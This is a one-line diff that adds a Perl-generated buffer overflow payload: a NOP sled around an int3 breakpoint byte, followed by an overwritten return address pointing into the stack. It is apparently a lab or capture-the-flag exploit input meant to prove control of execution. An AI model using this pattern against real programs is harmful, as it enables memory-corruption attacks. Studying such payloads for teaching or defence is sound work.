@@ -1,0 +1,1 @@
+"$(perl -e 'print "\x90" x31 . "\xcc" . "\x90" x 40 . "\xfa\xdd\xff\xff\xff\x7f"')"
